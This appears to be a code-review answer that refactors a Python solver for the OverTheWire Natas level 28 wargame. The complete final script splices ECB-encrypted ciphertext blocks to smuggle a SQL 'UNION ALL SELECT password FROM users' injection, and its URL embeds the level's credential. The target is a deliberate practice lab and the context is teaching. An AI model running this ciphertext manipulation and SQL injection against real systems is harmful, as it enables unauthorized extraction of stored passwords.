<div class="s-prose s-prose__disable-spoiler-hover js-post-body" itemprop="text">
<p><em>Disclaimer:</em></p>

<ul>
<li><em>There is no review for the crypto</em></li>
<li><em>The pieces of code below are based on a slightly modified code where the nested functions and lambda functions are renamed and extracted out to ease my understanding</em></li>
</ul>

<p><strong>Consistent spelling</strong></p>

<p>It looks like nothing but having a mix of <code>cypher</code> and <code>cipher</code> makes the code tedious to read/update. Try to be consistent even if both spellings are valid.</p>

<p><strong>Improving <code>_block_size</code></strong></p>

<p>A few things can be improved in <code>_block_size</code>:</p>

<ul>
<li>Avoid calling <code>len</code> more than once on a given <code>ciphertext</code> (as of now, <code>len</code> is called twice on the first and last <code>ciphertext</code> computed).</li>
<li>Avoid performing the computation for an empty <code>plaintext</code> more than twice.</li>
<li>Avoid having to keep track of the count <code>idx</code> explicitly. We could use <code>itertools.count</code> to have this done automatically.</li>
</ul>

<p>The first 2 points could be handled using additional variables and rewriting the loop. Then, taking into account the last point, we get:</p>

<pre><code>def get_block_size(session, url):
    pre_len = len(cipher_text(session, url, ''))
    for idx in itertools.count(1):
        cipher_len = len(cipher_text(session, url, 'a' * idx))
        if cipher_len &gt; pre_len:
            return cipher_len - pre_len
</code></pre>

<p><strong>Improving <code>_prefix_size</code></strong></p>

<p>The logic around indexing makes it look more complicated that it really is. Using a variable for the current block and the previous block could make this clearer.</p>

<p>It is not clear what <code>cipher_a</code> means. We initialise it with "" but the code later on would not work with that value (<code>TypeError: a bytes-like object is required, not 'str'</code>).
We should fail in a more explicit way when then value is not found. (This can be detected using the not-so-famous <code>else</code> for <code>for</code> loop which gets executed when the loops ends "normally", without a <code>break</code>).</p>

<p>Similarly, in the second loop when nothing is found, we return an implicit None which leads to another error (<code>TypeError: 'NoneType' object is not iterable</code>).</p>

<p>At this stage, we have:</p>

<pre><code>def get_prefix_size(session, url):
    block_size = get_block_size(session, url)
    cipher = cipher_text(session, url, 'a' * block_size * 3)
    prev_block = None
    for i in range(0, len(cipher), block_size):
        block = cipher[i:i+block_size]
        if block == prev_block:
            break
        prev_block = block
    else: # no break
        assert False # Handle error properly here

    for i in range(block_size):
        cipher = cipher_text(session, url, 'a' * (i + block_size))
        if block in cipher:
            return block_size, i, cipher.index(block)
    assert False # Handle error properly here
</code></pre>

<p>Or if you do not plan to handle errors properly:</p>

<pre><code>def get_prefix_size(session, url):
    block_size = get_block_size(session, url)
    cipher = cipher_text(session, url, 'a' * block_size * 3)
    prev_block = None
    for i in range(0, len(cipher), block_size):
        block = cipher[i:i+block_size]
        if block == prev_block:
            break
        prev_block = block

    for i in range(block_size):
        cipher = cipher_text(session, url, 'a' * (i + block_size))
        if block in cipher:
            return block_size, i, cipher.index(block)
</code></pre>

<p><strong>Improving <code>natas28</code></strong></p>

<p>The whole logic is pretty complicated. It probably deserves some explanations. Also, the variable names do not look very obvious to me.</p>

<p>The modulo computation could be slightly simplified. Indeed, in Python, <code>x % y</code> has the same sign as <code>y</code>. You could write: <code>(-len(sql) % block_size)</code></p>

<p>The computations performed with <code>index</code> could probably be simplified: we add <code>index</code> "a" to a string, then compute the overall length, then substract <code>index</code>. </p>

<pre><code>sql = " UNION ALL SELECT concat(username, 0x3A ,password) FROM users #"
sql_with_suffix = sql + 'b' * (-len(sql) % block_size)

ct = cipher_text(session, url, 'a' * index + sql_with_suffix)
e_sql = ct[cipher_size:cipher_size+len(sql_with_suffix)]
</code></pre>

<p><strong>Simplify SQL and parsing</strong></p>

<p>You write your query to get something under the format username:password when you only care about the password.</p>

<hr>

<p><strong>Conclusion</strong></p>

<p>I haven't changed much in your code. Just details here and there. I'm still wrapping my head around the crypto techniques used but it sounds very interesting.</p>

<pre><code>import requests
import re
import base64
from urllib.parse import quote, unquote
import itertools

def cipher_text(session, url, plain_text):
    return base64.b64decode(unquote(session.post(url, data={"query":plain_text}).url.split("query=")[1]))

def get_block_size(session, url):
    pre_len = len(cipher_text(session, url, ''))
    for idx in itertools.count(1):
        cipher_len = len(cipher_text(session, url, 'a' * idx))
        if cipher_len &gt; pre_len:
            return cipher_len - pre_len

def get_prefix_size(session, url):
    block_size = get_block_size(session, url)
    cipher = cipher_text(session, url, 'a' * block_size * 3)
    prev_block = None
    for i in range(0, len(cipher), block_size):
        block = cipher[i:i+block_size]
        if block == prev_block:
            break
        prev_block = block

    for i in range(block_size):
        cipher = cipher_text(session, url, 'a' * (i + block_size))
        if block in cipher:
            return block_size, i, cipher.index(block)

def natas28(url):
    session = requests.Session()
    block_size, index, cipher_size = get_prefix_size(session, url)
    cipher = cipher_text(session, url, 'a'* (block_size // 2))
    beg, end = cipher[:cipher_size], cipher[cipher_size:]

    sql = " UNION ALL SELECT password FROM users #"
    sql_with_suffix = sql + 'b' * (-len(sql) % block_size)

    ct = cipher_text(session, url, 'a' * index + sql_with_suffix)
    e_sql = ct[cipher_size:cipher_size+len(sql_with_suffix)]

    response = session.get(url + "search.php/?query=", params={"query": base64.b64encode(beg + e_sql + end)})
    return re.findall(r"&lt;li&gt;(.{32})&lt;\/li&gt;", response.text)[0]

if __name__ == '__main__':
     password = natas28('http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/')
     print("Password = " + password)
</code></pre>
    </div>